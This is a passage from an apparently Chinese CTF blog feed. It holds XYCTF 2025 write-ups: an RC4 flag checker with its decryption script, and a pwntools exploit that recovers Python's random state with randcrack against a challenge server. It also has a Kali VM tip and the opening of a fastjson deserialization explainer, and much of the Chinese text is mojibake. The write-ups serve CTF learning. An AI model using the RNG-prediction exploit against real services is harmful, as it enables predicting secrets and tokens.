1114112))+chr(int((986700//8970)% 1114112))+chr(int((78064//952)% 1114112))+chr(int((-5671+5738)% 1114112))+chr(int((-6282+6322)% 1114112))+chr(int((4287-4185)% 1114112))+chr(int((3549-3441)% 1114112))+chr(int((790162//8146)% 1114112))+chr(int((8188-8085)% 1114112))+chr(int((-800+844)% 1114112))+chr(int((522-490)% 1114112))+chr(int((-5550+5663)% 1114112))+chr(int((284291//2389)% 1114112))+chr(int((-9338+9440)% 1114112))+chr(int((-6438+6539)% 1114112))+chr(int((8277-8236)% 1114112))+chr(int((-8711+8752)% 1114112))+chr(int((-5591+5623)% 1114112))+chr(int((148291//2431)% 1114112))+chr(int((-3434+3466)% 1114112))+chr(int((425372//5597)% 1114112))+chr(int((-5132+5199)% 1114112))+chr(int((-322+419)% 1114112))+chr(int((185380//1612)% 1114112))+chr(int((5352-5251)% 1114112))+chr(int((365160//9129)% 1114112))+chr(int((9277-9158)% 1114112))+chr(int((-489+590)% 1114112))+chr(int((913002//8951)% 1114112))+chr(int((-8433+8531)% 1114112))+chr(int((8830-8713)% 1114112))+chr(int((1089-970)% 1114112))+chr(int((192990//1838)% 1114112))+chr(int((-9564+9681)% 1114112))+chr(int((-5453+5554)% 1114112))+chr(int((40221//981)% 1114112))+chr(int((-7928+7960)% 1114112))+chr(int((756672//9008)% 1114112))+chr(int((785824//7556)% 1114112))+chr(int((1607-1506)% 1114112))+chr(int((-5161+5271)% 1114112))+chr(int((-8087+8100)% 1114112))+chr(int((90010//9001)% 1114112))+chr(int((34688//1084)% 1114112))+chr(int((20224//632)% 1114112))+chr(int((8731-8699)% 1114112))+chr(int((178496//5578)% 1114112))+chr(int((-837+914)% 1114112))+chr(int((-4694+4809)% 1114112))+chr(int((-7603+7706)% 1114112))+chr(int((619212//9382)% 1114112))+chr(int((1092906//9846)% 1114112))+chr(int((7594-7474)% 1114112))+chr(int((69632//2176)% 1114112))+chr(int((133042//3913)% 1114112))+chr(int((9457-9390)% 1114112))+chr(int((2319-2208)% 1114112))+chr(int((475200//4320)% 1114112))+chr(int((-8977+9080)% 1114112))+chr(int((-8597+8711)% 1114112))+chr(int((1592-1495)% 1114112))+chr(int((754812//6507)% 1114112))+chr(int((-6078+6195)% 1114112))+chr(int((-9522+9630)% 1114112))+chr(int((1824-1727)% 1114112))+chr(int((-6145+6261)% 1114112))+chr(int((312690//2978)% 1114112))+chr(int((-1513+1624)% 1114112))+chr(int((902220//8202)% 1114112))+chr(int((1378-1263)% 1114112))+chr(int((-8522+8555)% 1114112))+chr(int((-6796+6828)% 1114112))+chr(int((-57+124)% 1114112))+chr(int((-4239+4350)% 1114112))+chr(int((964212//8458)% 1114112))+chr(int((573534//5031)% 1114112))+chr(int((565903//5603)% 1114112))+chr(int((-8417+8516)% 1114112))+chr(int((1116732//9627)% 1114112))+chr(int((-8648+8680)% 1114112))+chr(int((-6586+6656)% 1114112))+chr(int((-1832+1908)% 1114112))+chr(int((-5339+5404)% 1114112))+chr(int((559267//7877)% 1114112))+chr(int((138765//4205)% 1114112))+chr(int((2868-2834)% 1114112))+chr(int((556-543)% 1114112))+chr(int((53810//5381)% 1114112))+chr(int((212589//3081)% 1114112))+chr(int((-4647+4755)% 1114112))+chr(int((712885//6199)% 1114112))+chr(int((-1506+1607)% 1114112))+chr(int((91234//7018)% 1114112))+chr(int((1299-1289)% 1114112))+chr(int((-4904+4936)% 1114112))+chr(int((9659-9627)% 1114112))+chr(int((117024//3657)% 1114112))+chr(int((38720//1210)% 1114112))+chr(int((440748//5724)% 1114112))+chr(int((19320//168)% 1114112))+chr(int((-9444+9547)% 1114112))+chr(int((-3384+3450)% 1114112))+chr(int((9050-8939)% 1114112))+chr(int((-6493+6613)% 1114112))+chr(int((-5110+5142)% 1114112))+chr(int((-2061+2095)% 1114112))+chr(int((1450-1363)% 1114112))+chr(int((111+3)% 1114112))+chr(int((9913-9802)% 1114112))+chr(int((152680//1388)% 1114112))+chr(int((-1082+1185)% 1114112))+chr(int((4066-4034)% 1114112))+chr(int((6896-6794)% 1114112))+chr(int((838-730)% 1114112))+chr(int((-2902+2999)% 1114112))+chr(int((5974//58)% 1114112))+chr(int((-8244+8290)% 1114112))+chr(int((-9640+9674)% 1114112))+chr(int((36491//2807)% 1114112))+chr(int((-2075+2085)% 1114112))+chr(int((-301+370)% 1114112))+chr(int((-2824+2934)% 1114112))+chr(int((-2915+3015)% 1114112))+chr(int((1811-1779)% 1114112))+chr(int((-7946+8019)% 1114112))+chr(int((-5275+5377)% 1114112))+chr(int((-7424+7437)% 1114112))+chr(int((34620//3462)% 1114112))  </span><br><span class="line">print(enc1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">MsgBox &quot;Dear CTFER. Have fun in XYCTF 2025!&quot;</span><br><span class="line">flag = InputBox(&quot;Enter the FLAG:&quot;, &quot;XYCTF&quot;)</span><br><span class="line">wefbuwiue = &quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot; &#x27; ô¦¢ôˆ“¨ôŠº¾ôšôˆ‘’C     4ô–ŠôŠƒ¥ôŠ¾†ôºô‰¦ô‰ºœô¾¼ôˆ£¥ï¿½        </span><br><span class="line">ô–…ôŠ·§ô‹¾šô–ˆô‹›¦ôŠ‚¼ô–¼ôˆ¿®ô‹²‰ï¿½</span><br><span class="line">qwfe = &quot;rc4key&quot;</span><br><span class="line"></span><br><span class="line">&#x27; ô’¿ôŠ»¤ôŠ’ô–ôˆ»§ô‰ª„RC4ô–ŠôŠƒ¥ôŠ¾†ô–‡ô‹·¦ô‰–°</span><br><span class="line">Function RunRC(sMessage, strKey)</span><br><span class="line">    Dim kLen, i, j, temp, pos, outHex</span><br><span class="line">    Dim s(255), k(255)</span><br><span class="line"></span><br><span class="line">    &#x27; ô–ˆô‰·¥ôŠ‹ô–Œô‰›¤ôŠ¾†ô¦’?</span><br><span class="line">    kLen = Len(strKey)</span><br><span class="line">    For i = 0 To 255</span><br><span class="line">        s(i) = i</span><br><span class="line">        k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1)) &#x27; ô–¯ôˆ›¨ô‰Š¥ô’½ô‹¿§ô‰’¨ASCIIô»ô‰›§ôŠ‚</span><br><span class="line">    Next</span><br><span class="line"></span><br><span class="line">    &#x27; KSAô–¯ôˆ›©ô‰Š¥ô¢°ôˆ¥ô‹ª¦</span><br><span class="line">    j = 0</span><br><span class="line">    For i = 0 To 255</span><br><span class="line">        j = (j + s(i) + k(i)) Mod 256</span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">    Next</span><br><span class="line"></span><br><span class="line">    &#x27; PRGAô–ŠôŠƒ¥ôŠ¾†ôšµôˆ‡§ôŠ¢‹</span><br><span class="line">    i = 0 : j = 0 : outHex = &quot;&quot;</span><br><span class="line">    For pos = 1 To Len(sMessage)</span><br><span class="line">        i = (i + 1) Mod 256</span><br><span class="line">        j = (j + s(i)) Mod 256</span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line"></span><br><span class="line">        &#x27; ô–ŠôŠƒ¥ôŠ¾†ô–¹ô‹›¨ô‹¶¬ô’¸ô‹«¥ôˆ¶ô–…ôŠ·¨ô‹¾›ô–ˆ?</span><br><span class="line">        Dim plainChar, cipherByte</span><br><span class="line">        plainChar = Asc(Mid(sMessage, pos, 1)) &#x27; ôš˜ôˆ»¦ô‰š‡ôšŒôˆ¥SCIIô–¤ôˆ“¦ô‰‚†</span><br><span class="line">        cipherByte = s((s(i) + s(j)) Mod 256) Xor plainChar</span><br><span class="line">        outHex = outHex &amp; Right(&quot;0&quot; &amp; Hex(cipherByte), 2)</span><br><span class="line">    Next</span><br><span class="line"></span><br><span class="line">    RunRC = outHex</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">&#x27; ô’¸ô‹¯¨ôŠªŒô¢¯ôˆ‡¨ô‹¯¨ô‹º‘</span><br><span class="line">If LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) Then</span><br><span class="line">    MsgBox &quot;Congratulations! Correct FLAG!&quot;</span><br><span class="line">Else</span><br><span class="line">    MsgBox &quot;Wrong flag.&quot;</span><br><span class="line">End If</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æ˜æ˜¾çš„RC4åŠ å¯†è¿‡ç¨‹ï¼Œè„šæœ¬è§£å¯†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">def rc4_decrypt(key, cipher_bytes):</span><br><span class="line">    # åˆå§‹åŒ–Sç›’</span><br><span class="line">    S = list(range(256))</span><br><span class="line">    j = 0</span><br><span class="line">    key_len = len(key)</span><br><span class="line">    # KSAé˜¶æ®µ</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + S[i] + key[i % key_len]) % 256</span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    # PRGAé˜¶æ®µç”Ÿæˆå¯†é’¥æµ</span><br><span class="line">    i = j = 0</span><br><span class="line">    keystream = []</span><br><span class="line">    for _ in range(len(cipher_bytes)):</span><br><span class="line">        i = (i + 1) % 256</span><br><span class="line">        j = (j + S[i]) % 256</span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = S[(S[i] + S[j]) % 256]</span><br><span class="line">        keystream.append(k)</span><br><span class="line">    # å¼‚æˆ–è§£å¯†</span><br><span class="line">    plain = bytes([c ^ k for c, k in zip(cipher_bytes, keystream)])</span><br><span class="line">    return plain</span><br><span class="line"></span><br><span class="line"># å¯†æ–‡å’Œå¯†é’¥</span><br><span class="line">hex_str = &quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot;</span><br><span class="line">cipher_bytes = bytes.fromhex(hex_str)</span><br><span class="line">key = b&#x27;rc4key&#x27;</span><br><span class="line"></span><br><span class="line"># è§£å¯†</span><br><span class="line">plaintext = rc4_decrypt(key, cipher_bytes)</span><br><span class="line">print(plaintext.decode())</span><br></pre></td></tr></table></figure><blockquote><p>flag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wnâ€™s_chall_is_r3@lly_gr3@t_&amp;_fuN!}</p></blockquote><p>å°†flag{}é‡Œé¢çš„è¿›è¡Œmd5åŠ å¯†ï¼Œå¹¶ç”¨XYCTF{}åŒ…å«</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406194815955.png" alt="image-20250406194815955"></p><blockquote><p>XYCTF{5f9f46c147645dd1e2c8044325d4f93c}</p></blockquote><h2 id="crypto">crypto</h2><h3 id="Division">Division</h3><p>æºç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@File    :   server.py</span><br><span class="line">@Time    :   2025/03/20 12:25:03</span><br><span class="line">@Author  :   LamentXU </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import random </span><br><span class="line">print(&#x27;----Welcome to my division calc----&#x27;)</span><br><span class="line">print(&#x27;&#x27;&#x27;</span><br><span class="line">menu:</span><br><span class="line">      [1]  Division calc</span><br><span class="line">      [2]  Get flag</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">while True:</span><br><span class="line">    choose = input(&#x27;: &gt;&gt;&gt; &#x27;)</span><br><span class="line">    if choose == &#x27;1&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            denominator = int(input(&#x27;input the denominator: &gt;&gt;&gt; &#x27;))</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;INPUT NUMBERS&#x27;)</span><br><span class="line">            continue</span><br><span class="line">        nominator = random.getrandbits(32)</span><br><span class="line">        if denominator == &#x27;0&#x27;:</span><br><span class="line">            print(&#x27;NO YOU DONT&#x27;)</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            print(f&#x27;&#123;nominator&#125;//&#123;denominator&#125; = &#123;nominator//denominator&#125;&#x27;)</span><br><span class="line">    elif choose == &#x27;2&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            ans = input(&#x27;input the answer: &gt;&gt;&gt; &#x27;)</span><br><span class="line">            rand1 = random.getrandbits(11000)</span><br><span class="line">            rand2 = random.getrandbits(10000)</span><br><span class="line">            correct_ans = rand1 // rand2</span><br><span class="line">            if correct_ans == int(ans):</span><br><span class="line">                print(&#x27;WOW&#x27;)</span><br><span class="line">                with open(&#x27;flag&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">                    print(f&#x27;Here is your flag: &#123;f.read()&#125;&#x27;)</span><br><span class="line">            else:</span><br><span class="line">                print(f&#x27;NOPE, the correct answer is &#123;correct_ans&#125;&#x27;)</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;INPUT NUMBERS&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;Invalid choice&#x27;)</span><br></pre></td></tr></table></figure><p>EXPï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from randcrack import RandCrack</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">sh=remote(&quot;47.94.217.82&quot;,28739 )</span><br><span class="line">data=[]</span><br><span class="line">for i in range(624):</span><br><span class="line">    sh.recvuntil(b&#x27;&gt;&gt;&gt; &#x27;)</span><br><span class="line">    sh.sendline(b&#x27;1&#x27;)</span><br><span class="line">    sh.recvuntil(b&#x27;tor: &gt;&gt;&gt; &#x27;)</span><br><span class="line">    sh.sendline(b&#x27;1&#x27;)</span><br><span class="line">    line=int(sh.recvline().decode().split(&#x27;=&#x27;)[1].replace(&#x27;\n&#x27;, &#x27;&#x27;).replace(&#x27; &#x27;, &#x27;&#x27;))</span><br><span class="line">    data.append(line)</span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RC = RandCrack()</span><br><span class="line">for i in data:</span><br><span class="line">    RC.submit(i)</span><br><span class="line"></span><br><span class="line">sh.sendline(b&#x27;2&#x27;)</span><br><span class="line">sh.recvuntil(b&#x27;er: &gt;&gt;&gt;&#x27;)</span><br><span class="line">rand1 = RC.predict_getrandbits(11000)</span><br><span class="line">rand2 = RC.predict_getrandbits(10000)</span><br><span class="line">correct_ans = rand1 // rand2</span><br><span class="line"></span><br><span class="line">sh.sendline(str(correct_ans).encode())</span><br><span class="line">sh.recvlines()  </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ğŸ¥§XYCTF2025wp,XYCTF2025-web-wp,XYCTF2025-misc-wp,XYCTF2025-re&amp;cryptoéƒ¨åˆ†wp</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="æ¯”èµ›wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>kaliè™šæ‹Ÿæœºå‘½ä»¤æ¡†è¾“å…¥å¡é¡¿è§£å†³æ–¹æ³•</title>
    <link href="https://blog.m3x1.cn/posts/76ed990f.html"/>
    <id>https://blog.m3x1.cn/posts/76ed990f.html</id>
    <published>2025-04-01T16:00:00.000Z</published>
    <updated>2025-04-01T14:21:41.340Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é€‰æ‹©ç‰ˆæœ¬">é€‰æ‹©ç‰ˆæœ¬</h2><p>â€œç¼–è¾‘æ­¤è™šæ‹Ÿæœºâ€-&gt;â€œé€‰é¡¹â€-&gt;â€œç‰ˆæœ¬â€</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401172803382.png" alt="image-20250401172803382"></p><p>å¾€ä½ç‰ˆæœ¬åˆ‡æ¢ï¼Œç„¶åçœ‹çœ‹å“ªä¸ªç‰ˆæœ¬ä¸å¡ã€‚</p><p>æˆ‘æ˜¯è¿™æ ·åšçš„ï¼Œå¸Œæœ›èƒ½å¸®åˆ°ä½ ã€‚</p><h2 id="åˆ‡æ¢usbå…¼å®¹è®¾ç½®">åˆ‡æ¢usbå…¼å®¹è®¾ç½®</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401222011607.png" alt="image-20250401222011607"></p><h2 id="è¾“å…¥æŠ“å–é€‰æ‹©é«˜">è¾“å…¥æŠ“å–é€‰æ‹©é«˜</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401222030589.png" alt="image-20250401222030589"></p>]]></content>
    
    
    <summary type="html">ğŸ¥§kaliè™šæ‹Ÿæœºå‘½ä»¤æ¡†è¾“å…¥å¡é¡¿è§£å†³æ–¹æ³•</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ã€vulhubæ¼æ´é¶åœºã€‘fastjsonååºåˆ—åŒ–æ¼æ´åŠfastjsonååºåˆ—åŒ–æ¼æ´å¤ç°</title>
    <link href="https://blog.m3x1.cn/posts/5e02e69e.html"/>
    <id>https://blog.m3x1.cn/posts/5e02e69e.html</id>
    <published>2025-03-31T16:00:00.000Z</published>
    <updated>2025-04-01T07:17:46.948Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="æ¼æ´åŸç†">æ¼æ´åŸç†</h2><h3 id="å•¥æ˜¯json">å•¥æ˜¯json?</h3><p>jsonå…¨ç§°æ˜¯JavaScript object notationã€‚å³JavaScriptå¯¹è±¡æ ‡è®°æ³•ï¼Œä½¿ç”¨é”®å€¼å¯¹è¿›è¡Œä¿¡æ¯çš„å­˜å‚¨ã€‚ä¸¾ä¸ªç®€å•çš„ä¾‹å­å¦‚ä¸‹ï¼š</p><p>{</p><pre><code>    &quot;name&quot;:&quot;BossFrank&quot;,    &quot;age&quot;:23,    &quot;media&quot;:[&quot;CSDN&quot;,&quot;bilibili&quot;,&quot;Github&quot;]</code></pre><p>}</p><p>jsonæœ¬è´¨å°±æ˜¯ä¸€ç§å­—ç¬¦ä¸²ï¼Œç”¨äºä¿¡æ¯çš„å­˜å‚¨å’Œäº¤æ¢ã€‚</p><h3 id="å•¥æ˜¯fastjson">å•¥æ˜¯fastjson?</h3><p>fastjson æ˜¯ä¸€ä¸ª æœ‰é˜¿é‡Œå¼€å‘çš„ä¸€ä¸ªå¼€æºJava ç±»åº“ï¼Œå¯ä»¥å°† Java å¯¹è±¡è½¬æ¢ä¸º JSON æ ¼å¼(åºåˆ—åŒ–)ï¼Œå½“ç„¶å®ƒä¹Ÿå¯ä»¥å°† JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º Java å¯¹è±¡ï¼ˆååºåˆ—åŒ–ï¼‰ã€‚Fastjson å¯ä»¥æ“ä½œä»»ä½• Java å¯¹è±¡ï¼Œå³ä½¿æ˜¯ä¸€äº›é¢„å…ˆå­˜åœ¨çš„æ²¡æœ‰æºç çš„å¯¹è±¡ï¼ˆè¿™å°±æ˜¯æ¼æ´æ¥æºï¼Œä¸‹æ–‡ä¼šè§£é‡Šï¼‰ã€‚ä½¿ç”¨æ¯”è¾ƒå¹¿æ³›ã€‚</p><h3 id="fastjsonåºåˆ—åŒ–-ååºåˆ—åŒ–åŸç†">fastjsonåºåˆ—åŒ–/ååºåˆ—åŒ–åŸç†</h3><p>fastjsonçš„æ¼æ´æœ¬è´¨è¿˜æ˜¯ä¸€ä¸ªjavaçš„ååºåˆ—åŒ–æ¼æ´ï¼Œç”±äºå¼•è¿›äº†AutoTypeåŠŸèƒ½ï¼Œfastjsonåœ¨å¯¹jsonå­—ç¬¦ä¸²ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè¯»å–åˆ°@typeçš„å†…å®¹ï¼Œå°†jsonå†…å®¹ååºåˆ—åŒ–ä¸ºjavaå¯¹è±¡å¹¶è°ƒç”¨è¿™ä¸ªç±»çš„setteræ–¹æ³•ã€‚</p><p>é‚£ä¹ˆä¸ºå•¥è¦å¼•è¿›Auto TypeåŠŸèƒ½å‘¢ï¼Ÿ</p><p>fastjsonåœ¨åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰ä½¿ç”¨Javaè‡ªå¸¦çš„åºåˆ—åŒ–æœºåˆ¶ï¼Œè€Œæ˜¯è‡ªå®šä¹‰äº†ä¸€å¥—æœºåˆ¶ã€‚å…¶å®ï¼Œå¯¹äºJSONæ¡†æ¶æ¥è¯´ï¼Œæƒ³è¦æŠŠä¸€ä¸ªJavaå¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå¯ä»¥æœ‰ä¸¤ç§é€‰æ‹©ï¼š</p><p>1.åŸºäºsetter/getter</p><p>2.åŸºäºå±æ€§ï¼ˆAutoTypeï¼‰</p><p>åŸºäºsetter/getterä¼šå¸¦æ¥ä»€ä¹ˆé—®é¢˜å‘¢ï¼Œä¸‹é¢ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾æœ‰å¦‚ä¸‹ä¸¤ä¸ªç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Apple</span> <span class="keyword">implements</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal price;</span><br><span class="line">    <span class="comment">//çœç•¥ setter/getterã€toStringç­‰</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">iphone</span> <span class="keyword">implements</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal price;</span><br><span class="line">    <span class="comment">//çœç•¥ setter/getterã€toStringç­‰</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ä¾‹åŒ–å¯¹è±¡ä¹‹åï¼Œå‡è®¾è‹¹æœå¯¹è±¡çš„priceä¸º0.5ï¼ŒAppleç±»å¯¹è±¡åºåˆ—åŒ–ä¸ºjsonæ ¼å¼åä¸ºï¼š</p><p>{â€œFruitâ€:{â€œpriceâ€:0.5}}</p><p>å‡è®¾iphoneå¯¹è±¡çš„priceä¸º5000,åºåˆ—åŒ–ä¸ºjsonæ ¼å¼åä¸ºï¼š</p><p>{â€œFruitâ€:{â€œpriceâ€:5000}}</p><p>å½“ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªæ¥å£çš„æ—¶å€™ï¼Œå°†è¿™ä¸ªç±»çš„å¯¹è±¡åºåˆ—åŒ–çš„æ—¶å€™ï¼Œå°±ä¼šå°†å­ç±»æŠ¹å»ï¼ˆapple/iphoneï¼‰åªä¿ç•™æ¥å£çš„ç±»å‹(Fruit)ï¼Œæœ€åå¯¼è‡´ååºåˆ—åŒ–æ—¶æ— æ³•å¾—åˆ°åŸå§‹ç±»å‹ã€‚æœ¬ä¾‹ä¸­ï¼Œå°†ä¸¤ä¸ªjsonå†ååºåˆ—åŒ–ç”Ÿæˆjavaå¯¹è±¡çš„æ—¶å€™ï¼Œæ— æ³•åŒºåˆ†åŸå§‹ç±»æ˜¯appleè¿˜æ˜¯iphoneã€‚</p><p>ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼š fastjsonå¼•å…¥äº†åŸºäºå±æ€§ï¼ˆAutoTypeï¼‰ï¼Œå³åœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼Œå…ˆæŠŠåŸå§‹ç±»å‹è®°å½•ä¸‹æ¥ã€‚ä½¿ç”¨@typeçš„é”®è®°å½•åŸå§‹ç±»å‹ï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œå¼•å…¥AutoTypeåï¼ŒAppleç±»å¯¹è±¡åºåˆ—åŒ–ä¸ºjsonæ ¼å¼åä¸ºï¼š</p><p>{ â€œfruitâ€:{ â€œ@typeâ€:â€œcom.hollis.lab.fastjson.test.Appleâ€, â€œpriceâ€:0.5 } }</p><p>å¼•å…¥AutoTypeåï¼Œiphoneç±»å¯¹è±¡åºåˆ—åŒ–ä¸ºjsonæ ¼å¼åä¸ºï¼š</p><p>{ â€œfruitâ€:{ â€œ@typeâ€:â€œcom.hollis.lab.fastjson.test.iphoneâ€, â€œpriceâ€:5000 } }</p><p>è¿™æ ·åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°±å¯ä»¥åŒºåˆ†åŸå§‹çš„ç±»äº†</p><h2 id="fastjsonååºåˆ—åŒ–æ¼æ´åŸç†">fastjsonååºåˆ—åŒ–æ¼æ´åŸç†</h2><p>ä½¿ç”¨AutoTypeåŠŸèƒ½è¿›è¡Œåºåˆ—å·çš„JSONå­—ç¬¦ä¼šå¸¦æœ‰ä¸€ä¸ª@typeæ¥æ 